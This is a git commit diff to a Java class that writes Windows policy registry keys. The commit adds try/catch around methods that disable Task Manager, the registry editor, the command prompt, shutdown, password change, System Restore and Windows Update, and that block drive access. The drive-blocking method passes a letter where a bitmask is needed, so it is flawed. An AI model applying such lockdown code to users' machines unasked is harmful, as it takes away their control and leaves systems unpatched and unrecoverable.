320ccdb9c3d5d9cdff175f3704d002e38558b733
ParkMini <parkteammini@gmail.com>
2023-12-15 10:11:34 +0900

    시스템 기능 비활성화 예외 처리

--- src/main/java/kr/pah/ServiceBlock.java
+++ src/main/java/kr/pah/ServiceBlock.java
@@ -24,75 +24,129 @@ public class ServiceBlock {
     }
 
     public static void disableTaskManager() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "1");
-        System.out.println("작업 관리자가 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "1");
+            System.out.println("작업 관리자가 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("작업 관리자 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableControlPanel() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", "1");
-        System.out.println("제어판이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", "1");
+            System.out.println("제어판이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("제어판 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableRegistryEditor() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "1");
-        System.out.println("레지스트리 편집기가 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "1");
+            System.out.println("레지스트리 편집기가 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("레지스트리 편집기 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableFolderOptions() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", "1");
-        System.out.println("파일 탐색기 옵션 변경이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", "1");
+            System.out.println("파일 탐색기 옵션 변경이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("파일 탐색기 옵션 변경 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableRunCommand() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", "1");
-        System.out.println("실행 명령 사용이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", "1");
+            System.out.println("실행 명령 사용이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("실행 명령 사용 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableSystemProperties() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoPropertiesMyComputer", "1");
-        System.out.println("시스템 설정 변경이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoPropertiesMyComputer", "1");
+            System.out.println("시스템 설정 변경이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("시스템 설정 변경 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableLogOff() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "StartMenuLogOff", "0");
-        System.out.println("로그오프 옵션이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "StartMenuLogOff", "0");
+            System.out.println("로그오프 옵션이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("로그오프 옵션 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableChangePassword() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableChangePassword", "1");
-        System.out.println("비밀번호 변경 옵션이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableChangePassword", "1");
+            System.out.println("비밀번호 변경 옵션이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("비밀번호 변경 옵션 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableShutDownOptions() {
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoClose", "1");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoClose", "1");
+            System.out.println("종료 옵션이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("종료 옵션 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableCommandPrompt() {
-        setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", "1");
-        System.out.println("명령 프롬프트가 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", "1");
+            System.out.println("명령 프롬프트가 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("명령 프롬프트 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableNetworkProperties() {
-        setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\Network Connections", "NC_LanProperties", "1");
-        System.out.println("네트워크 설정 변경이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\Network Connections", "NC_LanProperties", "1");
+            System.out.println("네트워크 설정 변경이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("네트워크 설정 변경 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableSystemRestore() {
-        setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore", "DisableSR", "1");
-        System.out.println("시스템 복원 기능이 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore", "DisableSR", "1");
+            System.out.println("시스템 복원 기능이 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("시스템 복원 기능 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
-
     public static void disableWindowsUpdate() {
-        setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "NoAutoUpdate", "1");
-        System.out.println("Windows 업데이트가 비활성화되었습니다.");
+        try {
+            setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "NoAutoUpdate", "1");
+            System.out.println("Windows 업데이트가 비활성화되었습니다.");
+        } catch (Exception e) {
+            System.err.println("Windows 업데이트 비활성화 중 오류 발생: " + e.getMessage());
+        }
     }
 
     public static void disableDriveAccess(String driveLetter) {
-        // 예: "NoDrives" 값에 4(드라이브 D:)을 설정하면 D 드라이브 접근이 금지됨.
-        // 드라이브 글자에 해당하는 비트를 계산하는 로직 필요.
-        setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDrives", driveLetter);
-        System.out.println(driveLetter + " 드라이브 접근이 금지되었습니다.");
+        try {
+            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDrives", driveLetter);
+            System.out.println(driveLetter + " 드라이브 접근이 금지되었습니다.");
+        } catch (Exception e) {
+            System.err.println(driveLetter + " 드라이브 접근 금지 중 오류 발생: " + e.getMessage());
+        }
     }
 
     private static void setRegistryValue(String path, String name, String value) {
